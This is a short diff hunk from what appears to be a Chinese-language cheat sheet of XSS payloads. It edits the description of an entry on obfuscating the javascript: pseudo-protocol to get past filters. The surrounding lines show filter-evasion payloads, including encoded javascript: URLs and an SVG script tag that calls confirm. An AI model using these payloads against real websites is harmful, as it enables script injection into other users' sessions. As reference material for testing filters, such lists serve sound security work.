@@ -507,7 +507,7 @@ javascript://https://DOMAIN/%250A1?alert(1):0
 "'>confirm&lpar;1)</Script><Svg><Script/1='
 ```
 **72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)** <br>
-用于绕过查找`javascript:alert(1)`的筛选器。在添加`alert(1)`之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的DOM操作（例如在基于位置的payload或基于DOM的XSS中）。<br>
+以下payload用于绕过查找`javascript:alert(1)`的筛选器。在添加`alert(1)`之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的DOM操作（例如在基于位置的payload或基于DOM的XSS中）。<br>
 ```
 javas&#99ript:1
 javascript&colon;1
